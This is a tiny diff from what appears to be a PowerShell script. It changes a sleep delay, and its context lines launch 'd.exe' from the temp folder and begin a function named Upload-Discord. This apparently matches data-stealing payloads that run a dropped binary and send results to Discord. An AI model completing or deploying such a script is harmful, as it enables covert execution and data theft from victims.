@@ -5,7 +5,7 @@ start-sleep 4
 
 start-process "$env:TMP\d.exe"
 
-start-sleep 5
+start-sleep 10
 
 
 function Upload-Discord {
